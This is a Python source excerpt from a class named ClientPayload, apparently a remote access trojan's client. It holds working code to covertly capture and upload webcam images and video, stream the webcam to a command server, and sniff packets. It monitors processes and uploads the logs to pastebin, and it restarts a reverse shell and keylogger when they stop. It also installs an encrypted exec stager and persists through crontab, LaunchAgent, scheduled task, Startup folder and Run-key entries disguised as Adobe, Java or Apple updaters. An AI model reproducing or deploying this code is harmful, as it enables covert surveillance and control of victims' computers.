                self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                self._workers['scanner-%d' % x].start()
            self._workers['scanner-%d' % x].join()
            return json.dumps(self._network)
        except Exception as e:
            self.debug('{} error: {}'.format(self._scan_network.func_name, str(e)))


    def _webcam_image(self, *args, **kwargs):
        try:
            dev = VideoCapture(0)
            r,f = dev.read()
            dev.release()
            if not r:
                return "Unable to access webcam"
            png = self._get_png_from_data(f)
            return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
        except Exception as e:
            self.debug('{} error: {}'.format(self._webcam_image.func_name, str(e)))


    def _webcam_video(self, *args, **kwargs):
        try:
            fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
            fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
            output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
            length  = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
            end     = time.time() + length
            dev     = VideoCapture(0)
            while True:
                ret, frame = dev.read()
                output.write(frame)
                if time.time() > end: break
            dev.release()
            result = self._upload_ftp(fpath, filetype='.avi')
            try:
                os.remove(fpath)
            except: pass
            return result
        except Exception as e:
            self.debug('{} error: {}'.format(self._webcam_video.func_name, str(e)))


    def _webcam_stream(self, port=None, retries=5):
        try:
            if not port:
                return self.webcam.usage
            host = self._session['socket'].getpeername()[0]
            port = int(port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while retries > 0:
                try:
                    sock.connect((host, port))
                except socket.error:
                    retries -= 1
                break
            if not retries:
                return 'Error: webcam stream unable to connect to server'
            dev = VideoCapture(0)
            try:
                t1 = time.time()
                while True:
                    try:
                        ret,frame=dev.read()
                        data = pickle.dumps(frame)
                        sock.sendall(struct.pack("L", len(data))+data)
                        time.sleep(0.1)
                    except Exception as e:
                        self.debug('Stream error: {}'.format(str(e)))
                        break
            finally:
                dev.release()
                sock.close()
        except Exception as e:
            self.debug('{} error: {}'.format(self._webcam_stream.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_add_encrypted_stager(self, name='AdobeFlashPlayer'):
        try:
            if ClientPayload._config['resources'].get('stager'):
                output      = []
                b64var      = self._get_random_var(6)
                aesvar      = self._get_random_var(6)
                key         = self._get_random_var(32)
                iv          = self._get_random_var(16)
                config      = ClientPayload._config['resources']['stager'].get('keys')
                data        = ClientPayload._config['resources']['stager'].get('code')
                main        = "\n\nif __name__ == '__main__':\n\tif len(sys.argv) > 1:\n\t\tif '--debug' in sys.argv:\n\t\t\t_debug = True\n\t\telse:\n\t\t\t_debug = False\n\t\tmain(config=%d)" % int(config)
                output_file = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', "{}.py".format(name))
                imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar] 
                _           = [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data.splitlines()]
                cipher      = AES.new(key, AES.MODE_CBC, iv)
                ciphertext  = base64.b64encode(cipher.encrypt(self._get_padded('\n'.join(output), AES.block_size, '{')))
                with file(output_file, 'w') as fp:
                    fp.write(";".join(imports) + "\nexec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\", 2).decrypt(%s(\"%s\")).rstrip(\"{\"))" % (aesvar, key, b64var, ciphertext))))
                return (True, output_file)
            else:
                return (False, "Error: missing resources required for encrypted stager")
        except Exception as e:
            return (False, '{} error: {}'.format(self._persistence_add_encrypted_stager.func_name, str(e)))
        

    @config(platforms=['win32','linux2','darwin'])
    def _persistence_remove_encrypted_stager(self, *args, **kwargs):
        try:
            target = self.persistence.methods['encrypted_stager']['result']
            if isinstance(target, bytes) and os.path.isfile(target):
                if os.name is 'nt':
                    unhide = os.popen('attrib -h %s' % target).read()
                os.remove(target)
                return True
            else:
                self.debug("File '{}' not found".format(target))
        except Exception as e:
            self.debug('{} error: {}'.format(self._persistence_remove_encrypted_stager.func_name, str(e)))
        return False


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_add_hidden_file(self, *args, **kwargs):
        if ClientPayload._config['resources'].get('stager'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                try:
                    if os.name is 'nt':
                        path = value
                        hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
                    else:
                        dirname, basename = os.path.split(value)
                        path = os.path.join(dirname, '.' + basename)
                        hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
                    if hide:
                        if path != value:
                            ClientPayload._config['stager'] = bytes(bytes_to_long(self._upload_pastebin(path)[-21:]))
                        return (True, path)
                except Exception as e:        
                    return (False, 'Adding hidden file error: {}'.format(str(e)))
            else:
                return (False, "File '{}' not found".format(value))


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_remove_hidden_file(self, *args, **kwargs):
        if ClientPayload._config['resources'].get('stager'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                try:
                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        return True
                except Exception as e:
                    self.debug('{} error: {}'.format(self._persistence_remove_hidden_file.func_name, str(e)))
        return False 


    @config(platforms=['linux2'])
    def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
        if ClientPayload._config['resources'].get('stager'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                try:
                    if not os.path.isdir('/var/tmp'):
                        os.makedirs('/var/tmp')
                    name = os.path.join('/var/tmp','.' + os.path.splitext(name)[0] + os.path.splitext(value)[1])
                    with file(name, 'w') as copy:
                        copy.write(open(value).read())
                    if not self.persistence.methods['crontab_job']['established']:
                        for user in ['root', os.getenv('USERNAME', os.getenv('NAME'))]:
                            try:
                                task = "0 */6 * * * {} {}".format(60/minutes, user, name)
                                with open('/etc/crontab', 'r') as fp:
                                    data= fp.read()
                                if task not in data:
                                    with file('/etc/crontab', 'a') as fd:
                                        fd.write('\n' + task + '\n')
                                return (True, name)
                            except Exception as e:
                                self.debug("{} error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                                try:
                                    os.remove(name)
                                except: pass
                    else:
                        return (True, name)
                except Exception as e:
                    self.debug("{} error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                    try:
                        os.remove(name)
                    except: pass
        return (False, None)


    @config(platforms=['linux2'])
    def _persistence_remove_crontab_job(self, name='flashplayer'):
        if ClientPayload._config['resources'].get('stager'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                try:
                    with open('/etc/crontab','r') as fp:
                        lines = [i.rstrip() for i in fp.readlines()]
                        for line in lines:
                            if name in line:
                                _ = lines.pop(line, None)
                    with open('/etc/crontab', 'a+') as fp:
                        fp.write('\n'.join(lines))
                    return True
                except Exception as e:
                    self.debug(str(e))
        return False


    @config(platforms=['darwin'])
    def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
        if ClientPayload._config['resources'].get('stager') and ClientPayload._config['resources'].get('launch agent'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                try:
                    code    = ClientPayload._config['resources'].get('bash')
                    label   = name
                    if not os.path.exists('/var/tmp'):
                        os.makedirs('/var/tmp')
                    fpath   = '/var/tmp/.{}.sh'.format(name)
                    bash    = code.replace('__LABEL__', label).replace('__FILE__', value)
                    with file(fpath, 'w') as fileobj:
                        fileobj.write(bash)
                    bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                    time.sleep(1)
                    launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                    if os.path.isfile(launch_agent):
                        os.remove(fpath)
                        return (True, launch_agent)
                except Exception as e2:
                    self.debug('Error: {}'.format(str(e2)))
        return (False, None)


    @config(platforms=['darwin'])
    def _persistence_remove_launch_agent(self, name='com.apple.update.manager'):
        if ClientPayload._config['resources'].get('stager'):
            if self.persistence.methods['launch_agent'].get('established'):
                launch_agent = self.persistence['launch_agent'].get('result')
                if os.path.isfile(launch_agent):
                    try:
                        os.remove(launch_agent)
                        return True
                    except: pass
        return False


    @config(platforms=['win32'])
    def _persistence_add_scheduled_task(self, name='Java-Update-Manager'):
        if ClientPayload._config['resources'].get('stager'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                tmpdir      = os.path.expandvars('%TEMP%')
                task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
                if not os.path.isfile(task_run):
                    with file(task_run, 'w') as copy:
                        copy.write(open(value).read())
                try:
                    cmd     = 'SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, task_run)
                    result  = subprocess.check_output(cmd, shell=True)
                    if 'SUCCESS' in result:
                        return (True, result.replace('"', ''))
                except Exception as e:
                    self.debug('Add scheduled task error: {}'.format(str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_scheduled_task(self, name='Java-Update-Manager'):
        if ClientPayload._config['resources'].get('stager'):
            try:
                return subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(name), shell=True) == 0
            except:
                return False


    @config(platforms=['win32'])
    def _persistence_add_startup_file(self, name='Java-Update-Manager'):
        if ClientPayload._config['resources'].get('stager'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                try:
                    appdata = os.path.expandvars("%AppData%")
                    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                    if not os.path.exists(startup_dir):
                        os.makedirs(startup_dir)
                    startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                        with file(startup_file, 'w') as fp:
                            fp.write(content)
                    return (True, startup_file)
                except Exception as e:
                    self.debug('{} error: {}'.format(self._persistence_add_startup_file.func_name, str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_startup_file(self, name='Java-Update-Manager'):
        if ClientPayload._config['resources'].get('stager'):
            if os.name != 'nt':
                return (False, None)
            appdata      = os.path.expandvars("%AppData%")
            startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_file = os.path.join(startup_dir, name) + '.eu.url'
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    return True
                except:
                    try:
                        _  = os.popen('del {} /f'.format(startup_file)).read()
                        return True
                    except: pass
            return False


    @config(platforms=['win32'])
    def _persistence_add_registry_key(self, name='Java-Update-Manager'):
        if ClientPayload._config['resources'].get('stager'):
            value = long_to_bytes(long(ClientPayload._config['resources'].get('stager')))
            if value and os.path.isfile(value):
                try:
                    self._get_registry_key(name, value)
                    return (True, name)
                except Exception as e:
                    self.debug('{} error: {}'.format(self._persistence_add_registry_key.func_name, str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_registry_key(self, name='Java-Update-Manager'):
        if ClientPayload._config['resources'].get('stager'):
            try:
                key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
                DeleteValue(key, name)
                CloseKey(key)
                return True
            except: pass
        return False


    def _packetsniffer_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src = udp_hdr[0]
            dst = udp_hdr[1]
            length = udp_hdr[2]
            chksum = udp_hdr[3]
            data = data[8:]
            self.packetsniffer.capture.append('|================== UDP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|================================================|')
            return data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('UDP', str(e)))


    def _packetsniffer_tcp_header(self, recv_data):
        try:
            tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num = tcp_hdr[2]
            ack_num = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]
            self.packetsniffer.capture.append('|================== TCP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniffer.capture.append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('TCP', str(e)))


    def _packetsniffer_ip_header(self, data):
        try:
            ip_hdr = struct.unpack('!6H4s4s', data[:20]) 
            ver = ip_hdr[0] >> 12
            ihl = (ip_hdr[0] >> 8) & 0x0f
            tos = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id = ip_hdr[2]
            flags = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum = ip_hdr[5]
            src = socket.inet_ntoa(ip_hdr[6])
            dest = socket.inet_ntoa(ip_hdr[7])
            data = data[20:]
            self.packetsniffer.capture.append('|================== IP HEADER ===================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniffer.capture.append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('IP', str(e)))


    def _packetsniffer_eth_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto = eth_hdr[2] >> 8
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|================== ETH HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniffer.capture.append('|================================================|')
            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))


    def _process_list(self, *args, **kwargs):
        try:
            output  = {}
            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
                pid = i.split()[1 if os.name is 'nt' else 0]
                exe = i.split()[0 if os.name is 'nt' else -1]
                if exe not in output:
                    if len(json.dumps(output)) < 4096:
                        output.update({pid: exe})
                    else:
                        break
            return json.dumps(output)
        except Exception as e:
            self.debug("{} error: '{}'".format(self._process_list.func_name, str(e)))


    def _process_search(self, arg, **kwargs):
        try:
            if not isinstance(arg, str) or not len(arg):
                return "usage: process search [PID/name]"
            output  = {}
            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
                pid = i.split()[1 if os.name is 'nt' else 0]
                exe = i.split()[0 if os.name is 'nt' else -1]
                if arg in exe:
                    if len(json.dumps(output)) < 4096:
                        output.update({pid: exe})
                    else:
                        break
            return json.dumps(output)
        except Exception as e:
            self.debug("{} error: '{}'".format(self._process_search.func_name, str(e)))


    def _process_kill(self, arg):
        try:
            output  = {}
            for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
                pid = i.split()[1 if os.name is 'nt' else 0]
                exe = i.split()[0 if os.name is 'nt' else -1]
                if str(arg).isdigit() and int(arg) == int(pid):
                    try:
                        _ = os.popen('taskkill /pid %s /f' % pid if os.name is 'nt' else 'kill -9 %s' % pid).read()
                        output.update({str(arg): "killed"})
                    except:
                        output.update({str(arg): "not found"})
                else:
                    try:
                        _ = os.popen('taskkill /im %s /f' % exe if os.name is 'nt' else 'kill -9 %s' % exe).read()
                        output.update({str(p.name()): "killed"})
                    except Exception as e:
                        ClientPayload.debug(str(e))
                return json.dumps(output)
        except Exception as e:
            self.debug("{} error: '{}'".format(self._process_kill.func_name, str(e)))


    def _process_monitor(self, keyword=None):
        try:
            if not len(self.process.buffer.getvalue()):
                self.process.buffer.write("Time, User , Executable, PID, Privileges")
            c = wmi.WMI()
            process_watcher = c.Win32_Process.watch_for("creation")
            while True:
                try:
                    new_process = process_watcher()
                    proc_owner  = new_process.GetOwner()
                    proc_owner  = "%s\\%s" % (proc_owner[0],proc_owner[2])
                    create_date = new_process.CreationDate
                    executable  = new_process.ExecutablePath
                    pid         = new_process.ProcessId
                    parent_pid  = new_process.ParentProcessId
                    output      = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
                    if not keyword:
                        self.process.buffer.write(output)
                    else:
                        if keyword in output:
                            self.process.buffer.write(output)
                except Exception as e1:
                    self.debug("{} error: '{}'".format(self._process_monitor.func_name, str(e1)))
                if self._abort:
                    break
        except Exception as e2:
            self.debug("{} error: '{}'".format(self._process_monitor.func_name, str(e2)))


    def _process_logger(self, *args, **kwargs):
        try:
            while True:
                if self.process.buffer.tell() > self.process.max_bytes:
                    try:
                        task_id = self._task_id(self._process_monitor.func_name)
                        result  = self._upload_pastebin(self.process.buffer) if 'ftp' not in args else self._Upload_ftp(self.process.buffer)
                        self._results[task_id] = {'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
                        self.process.buffer.reset()
                    except Exception as e:
                        self.debug("{} error: {}".format(self._process_logger.func_name, str(e)))
                elif self._abort:
                    break
                else:
                    time.sleep(5)
        except Exception as e:
            self.debug("{} error: '{}'".format(self._process_logger.func_name, str(e)))


    def _process_start_monitor(self, *args, **kwargs):
        try:
            self._workers[self._process_monitor.func_name] = threading.Thread(target=self._process_monitor, args=args, kwargs=kwargs, name=time.time()) 
            self._workers[self._process_monitor.func_name].daemon = True
            self._workers[self._process_monitor.func_name].start()
            self._workers[self._process_logger.func_name] = threading.Thread(target=self._process_logger, name=time.time())
            self._workers[self._process_logger.func_name].daemon = True
            self._workers[self._process_logger.func_name].start()
            return "Monitoring process creation and uploading logs"
        except Exception as e:
            self.debug("{} error: '{}'".format(self._process_monitor.func_name, str(e)))


    def _server_send(self, **kwargs):
        self._session['connection'].wait()
        try:
            text = json.dumps(kwargs)
            data = self._encrypt_data(text)
            self._session['socket'].send(data + '\n')
        except Exception as e:
            self.debug('{} error: {}'.format(self._server_send.func_name, str(e)))


    def _server_recv(self):
        data = ''
        while '\n' not in data:
            try:
                data += self._session['socket'].recv(65556)
            except socket.timeout:
                break
        if data and len(bytes(data)):
            try:
                text = self._decrypt_data(bytes(data).rstrip())
                return json.loads(text)
            except Exception as e:
                self.debug('{} error: {}'.format(self._server_recv.func_name, str(e)))
    
 
    def _server_connect(self, port=1337):
        try:
            host = self._get_server_addr()
            self._session['socket'].connect((host, port))
            self._session['connection'].set()
            return
        except Exception as e:
            self.debug("{} error: {}".format(self._server_connect.func_name, str(e)))
            self._session['connection'].clear() if bool('connection' in self._session and isinstance(self._session['connection'], threading.Event)) else None
            print(str(e))            
        self.kill()
        time.sleep(5)
        return self.run()


    def _session_id(self):
        try:
            if self._session['connection'].wait(timeout=3.0):
                self._session['socket'].sendall(self._encrypt_data(json.dumps(self._sysinfo)) + '\n')
                buf      = ""
                attempts = 1
                while '\n' not in buf:
                    try:
                        buf += self._session['socket'].recv(1024)
                    except socket.timeout:
                        if attempts <= 3:
                            self.debug('Attempt %d failed - no Session ID received from server\nRetrying...' % attempts)
                            attempts += 1
                            continue
                        else:
                            break
                if buf and len(bytes(buf)):
                    session_id = self._decrypt_data(buf.rstrip()).strip().rstrip()
                    if len(str(session_id)) == SHA256.block_size:
                        self.debug("Session ID: {}".format(session_id))
                        return session_id
            else:
                self.debug("{} timed out".format(self._session_id.func_name))
        except Exception as e:
            self.debug("{} error: {}".format(self._session_id.func_name, str(e)))
        self.debug("Invalid Session ID: {}\nRestarting in 5 seconds...".format(bytes(session_id)))
        self.kill()
        time.sleep(5)
        return self.run()


    def _session_key(self):
        try:
            if self._session['connection'].wait(timeout=3.0):
                g  = 2
                p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
                a  = bytes_to_long(os.urandom(32))
                xA = pow(g, a, p)
                self._session['socket'].send(long_to_bytes(xA))
                xB = bytes_to_long(self._session['socket'].recv(256))
                x  = pow(xB, a, p)
                y  = SHA256.new(long_to_bytes(x)).hexdigest()
                return self._get_obfuscated(y)
            else:
                self.debug("{} timed out".format(self._session_key.func_name))
        except Exception as e:
            self.debug("{} error: {}\nRestarting in 5 seconds...".format(self._session_key.func_name, str(e)))
        self.kill()
        time.sleep(5)
        return self.run()


    def _task_id(self, task):
        try:
            return SHA256.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
        except Exception as e:
            self.debug("{} error: {}".format(self._task_id.func_name, str(e)))


    def _task_threader(self):
        try:
            while True:
                try:
                    method, task = self._tasks.get_nowait()
                    method(task)
                    self._tasks.task_done()
                except:
                    break
        except Exception as e:
            self.debug("{} error: {}".format(self._task_threader.func_name, str(e)))


    @config(flag=threading.Event())
    def _task_manager(self):
        try:
            while True:
                if self._abort:
                    break
                else:
                    self._task_manager.flag.wait()
                    jobs = self._workers.items()
                    for task, worker in jobs:
                        if not worker.is_alive():
                            dead = self._workers.pop(task, None)
                            del dead
                            if 'keylogger_manager' in task:
                                self._workers['keylogger_manager'] = threading.Thread(target=self._keylogger_manager, name=time.time())
                                self._workers['keylogger_manager'].daemon = True
                                self._workers['keylogger_manager'].start()
                            elif 'reverse_tcp_shell' in task:
                                self._workers['reverse_tcp_shell'] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
                                self._workers['reverse_tcp_shell'].start()    
                    time.sleep(2)
            self.kill()
            sys.exit()
        except Exception as e:
            self.debug('{} error: {}'.format(self._task_manager.func_name, str(e)))


    def _decrypt_data(self, data, key=None):
        try:
            if not key:
                key = self._get_deobfuscated(self._session['key'])
            return getattr(self, '_decrypt_{}'.format(self._sysinfo['encryption']))(data, key)
        except Exception as e:
            self.debug('{} error: {}'.format(self._decrypt_data.func_name, str(e)))


    def _decrypt_file(self, filepath, key=None):
        if os.path.isfile(filepath):
            try:
                with open(filepath, 'rb') as fp:
                    ciphertext = fp.read()
                plaintext = self._decrypt_data(ciphertext) if not key else self._decrypt_data(ciphertext, key)
                with open(filepath, 'wb') as fd:
                    fd.write(plaintext)
                return filepath
            except Exception as e1:
                self.debug("{} error: {}".format(self._decrypt_file.func_name, str(e1)))
        else:
            return "File '{}' not found".format(filepath)
                                

    def _encrypt_data(self, data, key=None):
        try:
            if not key:
                key = self._get_deobfuscated(self._session['key'])
            return getattr(self, '_encrypt_{}'.format(self._sysinfo['encryption']))(data, key)
        except Exception as e:
            self.debug('{} error: {}'.format(self._encrypt_data.func_name, str(e)))


    def _encrypt_file(self, filepath, key=None):
        if os.path.isfile(filepath):
            try:
                with open(filepath, 'rb') as fp:
                    plaintext = fp.read()
                ciphertext = self._encrypt_data(plaintext, key) if key else self._encrypt_data(plaintext)
                with open(filepath, 'wb') as fd:
                    fd.write(ciphertext)
                return filepath
            except Exception as e:
                self.debug("{} error: {}".format(self._encrypt_file.func_name, str(e)))
        else:
            return "File '{}' not found".format(filepath)


    def _get_startup(self, **kwargs):
        try:
            self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ClientPayload._config['resources']['ports'] = json.loads(urllib.urlopen('https://pastebin.com/raw/ypfafLP3').read())
        except Exception as e1:
            ClientPayload.debug("{} error: {}".format(self._get_startup.func_name, str(e1)))
  

    def _get_command(self):
        commands = {}
        for cmd in vars(ClientPayload):
            if hasattr(vars(ClientPayload)[cmd], 'command'):
                try:
                    commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(ClientPayload, cmd).platforms, 'usage': getattr(ClientPayload, cmd).usage, 'description': getattr(ClientPayload, cmd).func_doc.strip().rstrip()}
                except Exception as e:
                    ClientPayload.debug("{} error: {}".format(self._get_command.func_name, str(e)))
        return commands


    def _get_sysinfo(self):
        info = {}
        for key in ['id', 'public_ip', 'private_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device', 'encryption']:
            value = '_get_%s' % key
            if hasattr(ClientPayload, value):
                try:
                    info[key] = getattr(ClientPayload, value)()
                except Exception as e:
                    self.debug("{} error: {}".format(self._get_sysinfo.func_name, str(e)))
        return info


    def _get_standby_mode(self):
        try:
            addr = None
            try:
                addr = self._session['socket'].getpeername()
            except: pass
            self.kill()
            while True:
                time.sleep(60)
                if addr:
                    try:
                        self.connect(host=addr[0], port=addr[1])
                    except: pass
                else:
                    self.connect()
                if self._session['connection'].is_set():
                    break
            return self.reverse_tcp_shell()
        except Exception as e:
            return '{} error: {}'.format(self._get_standby_mode.func_name, str(e))


    def _get_public_key(self):
        raw_buffer  = ""
        try:
            attempt     = 1
            self._session['socket'].sendall(self._encrypt_data(json.dumps({"request":"public_key"})) + '\n')
            while "\n" not in raw_buffer:
                try:
                    raw_buffer += self._session['socket'].recv(1024)
                except socket.timeout:
                    attempt += 1
                    if attempt <= 3:
                        self.debug("Timed out waiting for RSA Public Key - retrying...\nAttempt: %d" % attempt)
                        continue
                    else:
                        break
            if raw_buffer and len(str(raw_buffer)):
                key = self._decrypt_data(str(raw_buffer))
                rsa = RSA.importKey(key)
                return rsa
        except Exception as e:
            self.debug("{} error: {}".format(self._get_public_key.func_name, str(e)))
        self.debug("Invalid RSA Public Key: {}\nRestarting in 5 seconds...".format(str(raw_buffer)))
        self.kill()
        time.sleep(5)
        return self.run()


    def _get_packets(self, **kwargs):
        seconds = kwargs.get('seconds') if kwargs.get('seconds') else 30
        mode    = kwargs.get('mode') if kwargs.get('mode') else 'pastebin'
        limit   = time.time() + seconds
